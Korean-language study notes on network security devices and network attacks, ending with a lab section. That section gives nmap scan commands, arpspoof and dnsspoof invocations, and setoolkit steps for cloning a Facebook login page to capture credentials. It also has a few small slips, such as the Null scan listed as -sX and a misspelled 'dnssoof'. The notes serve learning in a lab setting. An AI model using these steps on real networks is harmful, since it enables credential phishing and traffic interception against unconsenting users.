## 🧠 주요 개념 정리

### 1. 방화벽 (Firewall)
- 외부/내부 네트워크 간의 통신 흐름 제어 장비
- IP, 포트, 프로토콜 기준으로 허용/차단
- **특징**
    - 트래픽 필터링 (ACL 기반)
    - NAT 기능, Stateful Inspection, 세션 제어
- **한계**
    - 암호화 트래픽 분석 어려움
    - 내부 위협 탐지 불가
    - 비인가 탐지 불가 → IDS 필요

#### 정책 설정 (Rule Set)

| 정책 ID | Source IP | Destination IP | Port | Protocol | Action |
| ----- | --------- | -------------- | ---- | -------- | ------ |
| 1     | Any       | 192.168.0.1    | 80   | TCP      | Allow  |
| 2     | Any       | Any            | 22   | TCP      | Deny   |


### 2. 침입 탐지 시스템 (IDS)
- 비인가 접근 시도, 이상 징후 탐지 시스템
- 원래 차단도 가능하지만 탐지 기능만 수행
- 실시간 알림 및 로그 기록
- **한계**
    - 암호화 트래픽 탐지 어려움

#### HIDS vs NIDS

| 구분 | HIDS | NIDS |
| --- | ---- | ---- |
| 위치    | 개별 호스트     | 네트워크 중간    |
| 탐지 대상 | 시스템 로그, 파일 | 패킷 전체      |
| 예시    | 시스템 접근 탐지  | DoS, 포트 스캔 |

#### 탐지 방식

| 구분 | 오용 탐지 (Misuse) | 이상 탐지 (Anomaly) |
| -- | -------------- | --------------- |
| 정의 | 알려진 공격 서명과 비교  | 정상과 다른 행동 탐지    |
| 장점 | 정확도 높음         | 신종 공격 탐지 가능     |
| 단점 | 신종 공격 탐지 불가    | 오탐 가능성 있음       |

#### False Positive / False Negative
- False Positive: 정상 트래픽을 공격으로 오탐지
- False Negative: 공격을 정상으로 판단 (탐지 실패)

### 3. 침입 방지 시스템 (IPS)
- IDS + 차단 기능 포함된 보안 장비
- 실시간 분석 후 탐지 + 차단 수행
- 주요 필터
    - Signature Filter
    - Protocol Anomaly Filter
    - Traffic Behavior Filter
    - Rate-based Filter

### 4. WAF (Web Application Firewall)
- 웹 애플리케이션 계층(7계층) 공격 방어 장비
- SQL Injection, XSS, Directory Traversal 등 탐지/차단
- HTTP 기반 공격 대응

### 5. NAC (Network Access Control)
- 인증된 사용자만 네트워크 접근 허용
- 장치 검사, 사용자 인증, 보안 정책 검사

### 6. VPN (Virtual Private Network)
- 공용망을 통한 사설망 통신 터널 형성
- 원격지에서 안전하게 내부망 접속

#### VPN 구성도 (IPsec/SSL VPN 기반 흐름 포함)

``` text
 ┌────────────────────┐
 │    Remote User     │     ◄──── 재택, 출장자 등
 └────────┬───────────┘
          │
          ▼
 ┌──────────────────────┐
 │    Public Internet   │   ◄──── 일반 인터넷 회선
 └────────┬─────────────┘
          │
          ▼
 ┌───────────────────────────────┐
 │         VPN Gateway           │  ◄──── 보통 Firewall과 연동되거나 별도 장비 구성
 │  (IPsec / SSL 터널 종단점)     │
 │  - 사용자 인증                 │
 │  - 암호화/복호화               │
 │  - NAT 적용 가능               │
 └────┬──────────────┬──────────┘
      │              │
      ▼              ▼
┌────────────┐   ┌────────────────────────────┐
│ AAA Server │   │       Internal Network     │
│ (인증 서버) │   │                            │
└────────────┘   │ ┌────────────┐  ┌────────┐ │
                 │ │  DB Server │  │ ERP    │ │
                 │ └────────────┘  └────────┘ │
                 │                            │
                 └────────────────────────────┘
```

| 구성 요소 | 역할 |
| -------- | --- |
| **Remote User** | 외부에서 접속하려는 직원 (재택근무, 출장 등) |
| **Public Internet** | 일반 인터넷을 통해 VPN 서버와 통신 |
| **VPN Gateway** | IPsec 또는 SSL 터널의 종단점으로, 사용자 인증, 암호화/복호화, 터널 유지 |
| **AAA Server** | 인증, 인가, 계정 정보를 제공 (Radius, TACACS+) |
| **Internal Network** | 사내 업무망으로, VPN 인증 성공 시 내부 리소스에 접근 가능 |

**접속 흐름 요약**
1. 외부 사용자가 VPN 클라이언트 실행
2. 인터넷을 통해 VPN Gateway에 연결 요청
3. AAA Server를 통해 사용자 인증 (ID/PW, OTP, 인증서 등)
4. 인증 후 암호화된 터널(IPsec 또는 SSL) 생성
5. 내부망 리소스(웹서버, 파일서버 등)에 마치 내부에서 접속한 것처럼 접근 가능

#### 계층별 암호화 프로토콜

| 계층 | 암호화 프로토콜 | 예시 |
| ---- | ------------ | ---- |
| 3계층 | IPsec | Cisco ASA |
| 4계층 | SSL/TLS | OpenVPN |
| 7계층 | HTTPS VPN | Web VPN |

#### Cisco ASA VPN 구성도
- IPsec 기반의 하드웨어 VPN 솔루션
- 인증서, 계정 인증, 암호화 정책 연동

### 7. UTM (Unified Threat Management)
- 방화벽, IDS, IPS, 안티바이러스, 웹 필터링 등을 통합한 장비
- 중소기업에서 다기능 보안 장비로 활용
- 중앙 집중 관리, 비용 절감

### 8. 보안망 구성도

#### 보안 장비 설치 모드

| 모드 | 설명 |
| --- | ---- |
| **Inline 모드** | 장비가 패킷 흐름의 경로 중간에 직접 배치됨 → 차단 가능 |
| **Out of Path**<br/>(Mirror 모드) | 장비는 트래픽을 복사해서 분석만 함 → 탐지만 가능, 차단 불가 |

| **VPN Gateway** | 외부 사용자 VPN 접속 통로 |
| **DMZ Zone** | 외부에 공개된 서버 위치 (웹, 메일, FTP) |

| **NAC** | 사용자 및 장치 인증 (인증 후 내부망 허용) |
| **HIDS** | 단말 내부 이상 행위 감지 (파일 변조, 루트킷 등) |

### 9. 네트워크 공격

#### Port Scan (포트 스캔)
- 호스트가 열어둔 포트들을 순차적으로 탐색하여 서비스 실행 여부를 확인하는 공격 전 단계의 정찰 행위.
- 공격자는 어떤 포트가 열려 있는지를 통해 시스템 취약점을 예측하거나 특정 공격 경로를 모색할 수 있음.
- **특징**
    - 비인가 접근은 아니나 보안상 위협이 될 수 있음
    - 대부분 **자동화 도구(nmap 등)**를 통해 빠르게 실행
    - 패턴 분석 어려움: 정상적인 트래픽과 비슷하게 위장 가능
- **사용 도구**
    - `nmap` : 가장 널리 쓰이는 포트 스캐너. 다양한 스캔 방식과 탐지 우회 기능을 제공

**스캔 방식 종류**

| 이름 | 설명 |
| --- | ---- |
| **TCP Full Open Scan** (Connect Scan) | 3-Way Handshake를 모두 수행 (SYN → SYN/ACK → ACK) 후 연결 종료<br>→ 탐지가 쉽지만 신뢰성 있음 |
| **TCP Half Open Scan** (SYN Scan) | SYN → SYN/ACK까지 받은 후, ACK 미전송(즉시 RST 보내 연결 안 함)<br>→ 빠르고 스텔스성 높음 |
| **Stealth Scan** | 보안 장비 우회를 위한 비표준 스캔 기법 (FIN, Xmas, Null 등) |
| **FIN Scan** | 연결 없이 FIN 패킷만 보냄. 응답 없으면 열린 포트로 간주 |
| **Xmas Scan** | FIN + URG + PUSH 플래그를 모두 설정하여 보내는 특이한 스캔 |
| **Null Scan** | 플래그 비설정 패킷 전송 (모두 0) |
| **UDP Scan** | 비연결성인 UDP를 대상으로 포트 열림 여부를 파악<br>→ 응답 없음 = 열린 포트 (신뢰도 낮음), ICMP 포트 도달 불가 응답 등 활용 |

> 대부분의 **보안 장비(Firewall, IDS/IPS)**는 이러한 스캔 행위를 이상행위로 탐지하려 시도함.

#### Pharming (파밍)
- 사용자가 정상적인 웹사이트 주소(URL)를 입력했음에도, 악성 사이트로 우회 접속되도록 유도하는 공격.
- 주로 DNS 시스템을 속이거나 조작하여 피해자를 낚음.
- **특징**
    - 사용자 행위 개입 없음: 클릭이나 다운로드 없이 단순 주소 입력만으로 유도됨
    - 웹사이트 위장: 실제 은행, 쇼핑몰 등과 똑같은 페이지를 구성하여 개인정보 탈취
    - 보안서버(HTTPS) 사용 여부로 구분 가능하지만, 가짜 인증서까지 위조하는 경우도 존재
- **Spoofing(스푸핑)**
    - 원래는 "속이다"라는 뜻으로, 정상 정보를 가장하여 위조된 정보를 전송하는 행위.
    - pharming은 spoofing 기법 중 하나로 분류됨.

**Spoofing의 주요 종류**

| 종류 | 설명 |
| ---------------- | ---------------------------------------------------------------------------------------------------------------- |
| **ARP Spoofing** | 로컬 네트워크에서 **가짜 ARP Reply**를 지속적으로 전송하여, 게이트웨이 주소 대신 공격자의 MAC 주소로 갱신되도록 유도<br>→ 공격자가 **Man-in-the-Middle** 위치를 확보 |
| **DNS Spoofing** | DNS 서버를 공격하거나, 사용자 시스템의 hosts 파일을 조작하여, 정상 도메인 요청을 **공격자가 통제하는 IP로 리다이렉션** |

**일반적인 예방 방법**
- 내부 DNS 서버 보호
- ARP 캐시 고정 설정
- 보안 DNS 사용 (DNSSEC 등)
- HTTPS 인증서 검증

## 💻 실습 내용

### 실습 주제 1: 네트워크 공격(Port Scanning, ARP Spoofing, DNS Spoofing)해보기
- `nmap`사용하여 **Port Scanning**해보기
    - **TCP Full Open Scan** : `nmap -sT [대상IP]`
    - **TCP Half Open Scan** : `nmap -sS [대상IP]`
    - **FIN Scan** : `nmap -sF [대상IP]`
    - **Xmas Scan** : `nmap -sX [대상IP]`
    - **Null Scan** : `nmap -sX [대상IP]`
    - **UDP Scan** : `nmap -sU [대상IP]`
- **ARP Spoofing** 공격 해보기
    - `arpspoof -i eth0 -t 192.168.10.40 192.168.10.2`
- **DNS Spoofing** 공격 해보기
    - DNS Table 생성 : `cd /` → `nano dns` → `192.168.10.10 www.naver.com`
    - `dnssoof -f /dns`
- 가짜 로그인 사이트를 만들어서 사용자 id, pw 탈취하기
    1. **kali**
        - `sudo su - root` -> `setoolkit` -> `1` -> `2` -> `3` -> `2` -> enter -> `http://facebook.com`
        - `sudo su - root` -> `arpspoof -i eth0 -t 192.168.10.40 192.168.10.2`
        - `sudo su - root` -> `cd /` -> `vi dns` -> 192.168.10.10 www.naver.com 입력 -> ctrl+o, enter, ctrl+x -> `dnsspoof -f /dns`
    2. **windows**
    - internet explorer에 www.naver.com

## ❓ 궁금한 점

- **ARP Spoofing이 가능한 이유는 ARP 프로토콜 자체가 인증을 하지 않기 때문인데, 이런 구조를 근본적으로 바꾸기는 어려울까?**
    - ARP Spoofing은 ARP 프로토콜이 신뢰 기반 구조로 설계되어 요청이 아닌 응답도 무조건 수용하고, 인증 절차가 전혀 없기 때문에 발생하는 구조적 취약점이다. 이 구조를 근본적으로 바꾸기는 어렵지만, ARP 캐시 고정(static ARP)이나 인증된 ARP(DAI, Dynamic ARP Inspection) 같은 보안 기능으로 완화할 수 있다.
- **DNS Spoofing은 공격자가 DNS 서버보다 더 빨리 응답을 사용자에게 보낼 수 있어야만 가능한 공격 기법인데 어떻게 가능한가?**
    - DNS Spoofing은 공격자가 사용자의 DNS 요청보다 빠르게 응답을 보내거나, DNS 서버 자체를 공격하여 가짜 레코드를 등록함으로써 가능해지며, 특히 DNS 응답을 위조해 캐시를 오염시키는 DNS 캐시 포이즈닝 방식이 자주 활용된다. 이 역시 DNSSEC 등의 보안 강화 기술로 대응할 수 있지만, 모든 환경에서 적용되지는 않고 있다.
